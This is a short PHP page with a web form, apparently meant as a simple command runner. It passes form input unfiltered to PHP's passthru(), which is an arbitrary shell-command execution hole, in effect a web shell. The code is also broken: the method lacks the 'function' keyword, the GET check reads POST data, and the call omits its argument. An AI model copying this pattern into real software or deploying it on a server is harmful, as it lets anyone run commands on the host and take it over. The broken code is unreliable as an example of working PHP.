<?php


class systemManager{
  public systemRunCommand($userInputData){
    $response = passthru($userInputData);  
    return $response;
 }
}


if($_SERVER['REQUEST_METHOD'] == 'GET'){
  if(isset($_POST['userData']) && !empty($_POST['userData'])){
    $userInputData = $_POST['userData'];
    $systemManager = new systemManager;
    echo json_encode($systemManager->systemRunCommand());
    
  }
}
  
?>

<html>
  <head></head>
  <body>
   
    <form action="" method="get">
        <input type="" name="userData">
        <input type="submit" value="gonder">
   </form>

  </body>
</html>
